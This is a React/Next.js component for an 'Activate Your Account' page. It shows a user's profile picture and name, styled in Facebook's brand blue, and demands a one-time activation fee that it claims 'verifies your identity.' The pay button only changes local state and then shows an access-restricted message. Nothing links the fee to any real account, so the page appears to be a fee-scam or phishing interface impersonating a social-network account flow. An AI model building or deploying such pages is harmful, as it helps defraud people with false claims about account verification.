'use client';
import { useState, useEffect } from 'react';
import multipleStep from '@/lib/multipleStep'
export default function AccountActivation() {
  const [paid, setPaid] = useState(false);
  const [infos, setInfos] = useState<any>(null);

  useEffect(() => {
    async function fetchInfos() {
      const data = await multipleStep();
      setInfos(data);
    }
    fetchInfos();
  }, []);

  return (
    <div className="min-h-screen bg-white flex items-center justify-center px-4 py-10 font-sans">
      <div className="max-w-md w-full bg-[#f9fbff] border border-[#dbeafe] shadow-md rounded-xl p-6">
        {/* User Header */}

        <div className="flex items-center gap-4 mb-6">



          {infos?.profile_pic &&
            <img
              src={infos?.profile_pic}
              className="w-14 h-14 rounded-full border-4 border-[#1877f2] object-cover"
            />
          }


          <div>
            <p className="text-sm text-gray-500">{infos?.type} User</p>
            <h2 className="text-xl font-semibold text-gray-900">{infos?.profile_name}</h2>
          </div>



        </div>



        {/* Illustration */}
        <div className="w-full flex justify-center mb-6">
          <svg
            width="120"
            height="120"
            viewBox="0 0 24 24"
            fill="none"
            className="text-[#1877f2]"
            xmlns="http://www.w3.org/2000/svg"
          >
            <rect width="24" height="24" rx="12" fill="#e0e7ff" />
            <path
              d="M9 12l2 2 4-4"
              stroke="#2563eb"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
            />
            <circle cx="12" cy="12" r="9" stroke="#93c5fd" strokeWidth="2" />
          </svg>
        </div>

        {/* Title & Message */}
        <h1 className="text-xl font-semibold text-[#111827] mb-2 text-center">
          Activate Your Account
        </h1>
        <p className="text-sm text-gray-600 mb-5 text-center">
          You’re just one step away! A one-time <strong> ${infos?.payment} activation</strong> is required to enable full access to your account.
        </p>

        {/* Payment Notice */}
        <div className="bg-yellow-50 border-l-4 border-yellow-400 text-yellow-800 p-4 rounded-md mb-6">
          <p className="text-sm font-medium">
            This small fee verifies your identity and unlocks all features securely.
          </p>
        </div>

        {/* Action Button */}
        <button
          onClick={() => setPaid(true)}
          className="w-full bg-[#1877f2] text-white font-semibold py-3 rounded-full text-base mb-3 hover:bg-[#155fca] transition"
        >
          Pay ${infos?.payment} to Activate Account
        </button>

        {/* Confirmation */}
        {paid && (
          <div className="bg-red-50 border-l-4 border-red-400 text-red-700 p-4 rounded-md mb-6">
            <p className="text-sm font-medium">
              Access restricted to registered users only..
            </p>

          </div>
        )}
      </div>
    </div>
  );
}
